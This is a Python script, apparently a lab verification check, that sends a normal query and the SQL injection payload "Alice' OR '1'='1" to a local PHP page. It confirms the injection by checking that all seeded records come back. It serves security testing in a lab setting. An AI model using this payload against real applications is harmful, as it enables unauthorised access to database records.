#!/usr/bin/env python3
import http.client
import re
import urllib.parse
from html.parser import HTMLParser

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"
TARGET = f"http://{HOST}:{PORT}{PATH}"

class RecordParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.in_p = False
        self.buf = []
        self.records = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "p":
            self.in_p = True
            self.buf = []

    def handle_endtag(self, tag):
        if tag.lower() == "p" and self.in_p:
            text = "".join(self.buf).strip()
            m = re.match(r"^ID\s*(\d+)\s*[：:]\s*(.*)$", text)
            if m:
                self.records.append((int(m.group(1)), m.group(2).strip()))
            self.in_p = False
            self.buf = []

    def handle_data(self, data):
        if self.in_p:
            self.buf.append(data)


def fetch_records(name):
    query = urllib.parse.urlencode({"name": name})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    try:
        conn.request(
            "GET",
            PATH + "?" + query,
            headers={"User-Agent": "S001-audit-check"},
        )
        resp = conn.getresponse()
        body = resp.read()
        status = resp.status
        if status in (301, 302, 303, 307, 308):
            raise RuntimeError(f"拒绝跟随重定向：HTTP {status}")
        if status != 200:
            raise RuntimeError(f"非 200 响应：HTTP {status}")
    finally:
        conn.close()

    text = body.decode("utf-8", errors="replace")
    parser = RecordParser()
    parser.feed(text)
    parser.close()
    return set(parser.records), text


def main():
    normal_expected = {(1, "Alice")}
    test_expected = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
    payload = "Alice' OR '1'='1"

    normal_records, _ = fetch_records("Alice")
    test_records, _ = fetch_records(payload)

    print("目标:", TARGET)
    print("普通请求解析记录:", sorted(normal_records))
    print("测试请求解析记录:", sorted(test_records))

    if normal_records != normal_expected:
        raise SystemExit(
            "普通对照失败：预期 {(1, 'Alice')}，"
            f"实际 {normal_records}；请检查入口、数据库连接和预置数据。"
        )

    if test_records != test_expected:
        raise SystemExit(
            "测试请求未得到预期记录集合：预期 "
            f"{test_expected}，实际 {test_records}；"
            "请检查查询是否可达、服务器是否重定向、HTML 输出结构或数据库预置数据是否不同。"
        )

    print("SUCCESS: 普通请求仅返回 Alice，测试请求返回三条预置业务记录。")


if __name__ == "__main__":
    main()
